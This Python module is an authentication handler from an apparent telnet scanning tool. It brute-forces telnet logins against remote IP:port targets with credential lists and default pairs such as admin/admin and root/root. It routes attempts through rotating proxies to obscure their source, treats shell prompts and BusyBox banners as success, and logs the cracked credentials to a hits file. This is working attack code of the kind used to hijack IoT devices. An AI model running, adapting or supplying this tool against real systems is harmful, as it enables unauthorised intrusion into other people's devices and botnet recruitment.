"""
Authentication Handler module for telnet login attempts
"""
import asyncio
import aiofiles
import logging
import time
from contextlib import suppress

logger = logging.getLogger("TelnetScanner.AuthHandler")

class AuthHandler:
    """Handles authentication attempts against telnet services"""
    
    def __init__(self, creds_file, hits_file, login_timeout=6, retry_attempts=2):
        """Initialize the authentication handler"""
        self.creds_file = creds_file
        self.hits_file = hits_file
        self.login_timeout = float(login_timeout)  # Convert to float to ensure compatibility
        self.retry_attempts = retry_attempts
        self.file_lock = asyncio.Lock()
        self.credentials = None  # Will be loaded on first use
    
    async def load_credentials(self):
        """Load credentials from file"""
        creds = []
        try:
            async with aiofiles.open(self.creds_file, "r") as f:
                async for line in f:
                    line = line.strip()
                    if ":" in line and not line.startswith("#"):
                        username, password = line.split(":", 1)
                        creds.append((username, password))
            
            if not creds:
                logger.warning(f"No valid credentials found in {self.creds_file}")
                # Add some default credentials
                creds = [("admin", "admin"), ("root", "root"), ("user", "user")]
            
            logger.info(f"Loaded {len(creds)} credential pairs")
            return creds
            
        except Exception as e:
            logger.error(f"Failed to load credentials: {e}")
            # Return default credentials
            return [("admin", "admin"), ("root", "root"), ("user", "user")]
    
    async def save_success(self, ip, port, username, password):
        """Save successful login to hits file"""
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        async with self.file_lock:
            try:
                async with aiofiles.open(self.hits_file, "a") as f:
                    await f.write(f"{timestamp} | {ip}:{port} | {username}:{password}\n")
                logger.debug(f"Saved successful hit: {ip}:{port} {username}:{password}")
                return True
            except Exception as e:
                logger.error(f"Failed to save hit: {e}")
                return False
    
    async def attempt_login(self, ip, port, username, password, proxy_manager, stats, attempt=1):
        """Attempt to login to a telnet service using rotating proxies"""
        # Get a proxy with smart rotation
        proxy = proxy_manager.get_proxy()
        proxy_ip, proxy_port = proxy.split(":")
        
        reader = writer = None
        try:
            # Update statistics
            stats.attempts += 1
            
            # Get connection via proxy
            reader, writer = await proxy_manager.open_http_proxy_tunnel(
                proxy_ip, int(proxy_port), ip, port
            )
            
            if not reader or not writer:
                # If connection failed, update proxy stats negatively
                if proxy != "127.0.0.1:0":  # Don't penalize direct connection
                    proxy_manager._update_proxy_stats(proxy, False)
                    
                # If we still have retry attempts, try with a different proxy
                if attempt <= self.retry_attempts:
                    logger.debug(f"Retrying with different proxy for {ip}:{port} (attempt {attempt}/{self.retry_attempts})")
                    return await self.attempt_login(ip, port, username, password, proxy_manager, stats, attempt+1)
                return False
            
            # Send username
            writer.write((username + "\r\n").encode())
            await writer.drain()
            await asyncio.sleep(0.2)
            
            # Send password
            writer.write((password + "\r\n").encode())
            await writer.drain()
            
            # Wait for response
            try:
                data = await asyncio.wait_for(reader.read(512), timeout=self.login_timeout)
                
                # Check for success indicators
                LOGIN_SUCCESS_INDICATORS = [
                    b"$", b"#", b">", b"Welcome", b"root@", b"admin@", b"shell",
                    b"successful", b"logged in", b"BusyBox", b"command"
                ]
                LOGIN_FAILURE_INDICATORS = [
                    b"incorrect", b"failed", b"invalid", b"wrong", b"failure", 
                    b"denied", b"bad", b"error", b"login:", b"password:", 
                    b"unauthorized", b"try again"
                ]
                
                if any(p in data.lower() for p in LOGIN_SUCCESS_INDICATORS) and not any(p in data.lower() for p in LOGIN_FAILURE_INDICATORS):
                    logger.info(f"[SUCCESS] {ip}:{port} -> {username}:{password} (via {proxy})")
                    await self.save_success(ip, port, username, password)
                    stats.hits += 1
                    
                    # Record successful proxy use
                    if proxy != "127.0.0.1:0":  # Don't record direct connections
                        proxy_manager._update_proxy_stats(proxy, True)
                        
                    return True
                
                # Record failed login but successful connection
                if proxy != "127.0.0.1:0":  # Don't penalize direct connection
                    # Minor negative update - connection worked but login failed
                    proxy_manager._update_proxy_stats(proxy, False)
                
                logger.debug(f"Login failed for {ip}:{port} with {username}:{password}")
                
            except asyncio.TimeoutError:
                logger.debug(f"Login timeout for {ip}:{port}")
                
        except Exception as e:
            if attempt <= self.retry_attempts:
                logger.debug(f"Login attempt error, retrying: {e}")
                return await self.attempt_login(ip, port, username, password, proxy_manager, stats, attempt+1)
            else:
                logger.debug(f"Login attempt failed after {attempt} tries: {e}")
                
        finally:
            # Clean up connection
            if writer:
                try:
                    writer.close()
                    await writer.wait_closed()
                except:
                    pass
                    
        return False
    
    async def try_all_creds_for_target(self, ip, port, semaphore, proxy_manager, stats):
        """Try all credentials for a specific IP:port target"""
        async with semaphore:
            logger.debug(f"Scanning {ip}:{port}")
            stats.scanned += 1
            
            # Load credentials if not already loaded
            if self.credentials is None:
                self.credentials = await self.load_credentials()
            
            tasks = []
            MAX_CONCURRENT_LOGINS = 5  # Limit concurrent login attempts per target
            login_semaphore = asyncio.Semaphore(MAX_CONCURRENT_LOGINS)
            
            for username, password in self.credentials:
                async def try_cred(u, p):
                    async with login_semaphore:
                        return await self.attempt_login(ip, port, u, p, proxy_manager, stats)
                
                task = asyncio.create_task(try_cred(username, password))
                tasks.append(task)
                
                # Process in small batches to avoid overwhelming the target
                if len(tasks) >= MAX_CONCURRENT_LOGINS:
                    for t in asyncio.as_completed(tasks):
                        try:
                            if await t:  # Login successful
                                # Cancel remaining tasks
                                for pending in tasks:
                                    if not pending.done():
                                        pending.cancel()
                                        with suppress(asyncio.CancelledError):
                                            await pending
                                return True
                        except asyncio.CancelledError:
                            pass
                        except Exception as e:
                            logger.error(f"Error in credential testing: {e}")
                    tasks.clear()
            
            # Process remaining tasks
            if tasks:
                for t in asyncio.as_completed(tasks):
                    try:
                        if await t:  # Login successful
                            # Cancel remaining tasks
                            for pending in tasks:
                                if not pending.done():
                                    pending.cancel()
                                    with suppress(asyncio.CancelledError):
                                        await pending
                            return True
                    except asyncio.CancelledError:
                        pass
                    except Exception as e:
                        logger.error(f"Error in credential testing: {e}")
            
            logger.debug(f"No successful login for {ip}:{port}")
            return False
